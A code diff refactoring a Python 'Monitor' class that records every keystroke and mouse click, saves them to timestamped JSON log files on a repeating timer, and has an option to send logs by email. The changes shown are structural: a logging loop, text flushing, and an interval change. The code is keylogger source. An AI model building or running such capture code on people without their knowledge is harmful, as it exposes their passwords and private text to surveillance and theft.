@@ -62,7 +62,7 @@ class Monitor:
     def __init__(self):
         # settings
         self.log_folder = 'logs'
-        self.log_interval = 5
+        self.log_interval = 10
         self.passphrase = 'fishing-in-the-river-champion'
         self.log_via_email = False
 
@@ -78,6 +78,14 @@ class Monitor:
         with open(f'{self.log_folder}/{timestamp()}.json', 'w') as log_file:
             log_file.write(json_string)
     
+    def update_text(self):
+        # don't update text if it is empty
+        if not self.text:
+            return
+
+        self.logs.append({'o' : self.text})
+        self.text = str()
+    
     def create_log(self):
         json_string = json.dumps(self.logs, indent=4)
         # for now we log even if there was no log contents
@@ -87,16 +95,16 @@ class Monitor:
             self.log_to_file(json_string)
 
         self.logs = list()
+     
+    def log_loop(self):
+        self.create_log()
 
-        timer = threading.Timer(interval=self.log_interval, function=self.create_log)
+        timer = threading.Timer(interval=self.log_interval, function=self.log_loop)
         timer.daemon = True
         timer.start()
     
     def record_raw_input(self, input_dict):
-        # only record text if it's not empty
-        if self.text:
-            self.logs.append({'o' : self.text})
-            self.text = str()
+        self.update_text()
         self.logs.append(input_dict)
 
     def on_press(self, key):
@@ -105,8 +113,7 @@ class Monitor:
             return
 
         if (key == keyboard.Key.esc):
-            if self.text:
-                self.logs.append({'o' : self.text})
+            self.create_log()
             self.mice.stop()
             return False
         
@@ -122,16 +129,17 @@ class Monitor:
             self.record_raw_input({'m' : button.name.upper()})
 
     def run(self):
-        # create the logs folder if it does not exist
-        try:
-            os.mkdir(self.log_folder)
-        except FileExistsError:
-            pass
+        # create the logs folder if it does not exist if running in file logging mode
+        if not self.log_via_email:
+            try:
+                os.mkdir(self.log_folder)
+            except FileExistsError:
+                pass
 
         self.keys.start()
         self.mice.start()
 
-        self.create_log()
+        self.log_loop()
 
         self.keys.join()
         self.mice.join()
